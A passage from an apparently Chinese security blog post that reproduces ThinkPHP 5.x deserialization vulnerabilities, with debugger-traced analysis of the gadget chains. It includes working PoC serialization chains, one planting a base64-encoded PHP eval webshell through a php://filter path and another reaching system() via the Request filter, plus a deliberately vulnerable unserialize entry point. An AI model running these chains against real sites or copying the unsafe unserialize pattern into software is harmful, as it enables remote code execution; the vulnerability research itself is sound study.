    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span><span class="token operator">=</span><span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token comment">//get_class($modelRelation->getModel()) == get_class($this->parent)</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$memcached</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">=</span><span class="token variable">$memcached</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">styles</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//Relation</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">HasOne</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span><span class="token operator">=</span><span class="token variable">$query</span><span class="token punctuation">;</span> <span class="token comment">//调用Query类的getModel</span>

            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">selfRelation</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span> <span class="token comment">//满足条件!$modelRelation->isSelfRelation()</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindAttr</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token operator">=></span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//控制__call的参数$attr</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcached</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment">//$this->handler等于File类</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'path'</span><span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'cache_subdir'</span><span class="token operator">=></span><span class="token constant boolean">false</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'prefix'</span><span class="token operator">=></span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'data_compress'</span><span class="token operator">=></span><span class="token constant boolean">false</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>


    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$memcached</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$output</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">(</span><span class="token variable">$memcached</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$query</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$hasone</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pivot</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span><span class="token variable">$hasone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$windows</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$pivot</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240327005914620.png" alt="image-20240327005914620"></p>
<hr>
<h2 id="5-1-x反序列化ajax链"><a href="#5-1-x反序列化ajax链" class="headerlink" title="5.1.x反序列化ajax链"></a>5.1.x反序列化ajax链</h2><h3 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>tp 5.1.38</p>
<p>composer.json</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">">=5.6.0"</span><span class="token punctuation">,</span>
    <span class="token property">"topthink/framework"</span><span class="token operator">:</span> <span class="token string">"5.1.38"</span><span class="token punctuation">,</span>
    <span class="token property">"topthink/think-captcha"</span><span class="token operator">:</span> <span class="token string">"2.*"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>该反序列化漏洞属于二次触发漏洞，因此我们将控制器中的Index控制器修改一下，准备一个反序列化入口：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ThinkPHP5_Unserialize:\n"</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">'&lt;style type="text/css">*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style>&lt;div style="padding: 24px 48px;"> &lt;h1>:) &lt;/h1>&lt;p> ThinkPHP V5.1&lt;br/>&lt;span style="font-size:30px">12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span>&lt;/p>&lt;/div>&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8">&lt;/script>&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js">&lt;/script>&lt;think id="eab4b9f840753f8e7">&lt;/think>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hello</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ThinkPHP5'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">'hello,'</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>
<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token comment">// 表单ajax伪装变量</span>
        <span class="token string single-quoted-string">'var_ajax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_ajax'</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"var_ajax"</span><span class="token operator">=></span><span class="token string single-quoted-string">'0w0'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>拿到结果再进行命令执行即可</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311112342724.png" alt="image-20240311112342724"></p>
<h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>在unserialize处下断点</p>
<p>然后跟进到我们的反序列化入口<code>__destruct</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311112847539.png" alt="image-20240311112847539"></p>
<p>进入<code>removeFiles</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311113028182.png" alt="image-20240311113028182"></p>
<p>在removeFiles方法，用<code>file_exists</code>方法检测文件是否存在，但是这里我们将filename属性改为了一个<code>think\model]\Pivot</code>对象（即把对象当字符串处理），因此会触发它的<code>toString</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311113613243.png" alt="image-20240311113613243"></p>
<p>这个时候我们注意到进了Conversion.php，即这里是<code>Conversion</code>对象，回顾一下前面说过的trait修饰符</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311114350699.png" alt="image-20240311114350699"></p>
<p>这里的 Conversion 被 trait 进行修饰了，然后我们观察一下 Pivot 对象的内部</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span>

    <span class="token comment">/** @var Model */</span>
    <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>

    <span class="token keyword">protected</span> <span class="token variable">$autoWriteTimestamp</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 架构函数
     * @access public
     * @param  array|object  $data 数据
     * @param  Model         $parent 上级模型
     * @param  string        $table 中间数据表名
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name type-declaration">Model</span> <span class="token variable">$parent</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span> <span class="token operator">=</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>它内部是没有 toString 魔术方法的，但是构造方法中调用的是父类的构造方法，他的父类是<code>Model</code>对象：</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311114606850.png" alt="image-20240311114606850"></p>
<p>即 Model 类在它的内部复用了被<code>trait</code>修饰的<code>Conversion</code>对象，而 Model 又是 Pivot 的父类，因此当 Pivot 被当成字符串输出时，就会调用 Conversion 类的 toString 方法，流程图如下（by Boogipop）</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311114800858.png" alt="image-20240311114800858"></p>
<p>回到链子，接下来进到<code>toJson</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311113932514.png" alt="image-20240311113932514"></p>
<p>接下来调用<code>toArray</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311114919350.png" alt="image-20240311114919350"></p>
<p>先遍历<code>this-&gt;append</code>属性，取出键值对</p>
<p>我们的poc中对应的是</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>因此 key 为 0w0 ，进入 getRelation 方法：</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311115116815.png" alt="image-20240311115116815"></p>
<p>此时<code>$name</code>不是null，并且我们没给<code>$this-&gt;relation</code>进行赋值，因此直接 return 一个null回来，接着就进入<code>getAttr</code>方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311115321549.png" alt="image-20240311115321549"></p>
<p>在里面又调用了 getData 方法，跟进</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311115446961.png" alt="image-20240311115446961"></p>
<p>在poc中我们将<code>$this-&gt;data</code>赋值为了一个<code>Request</code>对象</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"0w0"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因此会 return 一个Request对象，之后退出该方法回到外面</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311115803022.png" alt="image-20240311115803022"></p>
<p>这里<code>$relation</code>经过上述步骤变为 Request 对象，调用 visible 方法会触发<code>Request</code>对象的<code>__call</code>魔术方法，因为 visible 方法不存在，参数为<code>[calc,calc.exe]</code>也就是我们自定义的那个键值对</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311120019478.png" alt="image-20240311120019478"></p>
<p>首先使用<code>array_shift</code>往之前的<code>[calc,calc.exe]</code>数组插入<code>$this</code>也就是<code>Request</code>对象</p>
<p>之后调用<code>call_user_func_array</code>方法，其中<code>$this-&gt;hook[$method]</code>就是<code>$this-&gt;hook[&#39;visible&#39;]</code>，在 poc 中为<code>isAjax</code>方法，跟进该方法</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311120328245.png" alt="image-20240311120328245"></p>
<p>调用<code>param</code>方法，参数为我们 poc 中的<code>0w0</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"var_ajax"</span><span class="token operator">=></span><span class="token string single-quoted-string">'0w0'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟进 param 方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 获取当前请求的参数
 * @access public
 * @param  mixed         $name 变量名
 * @param  mixed         $default 默认值
 * @param  string|array  $filter 过滤方法
 * @return mixed
 */</span>
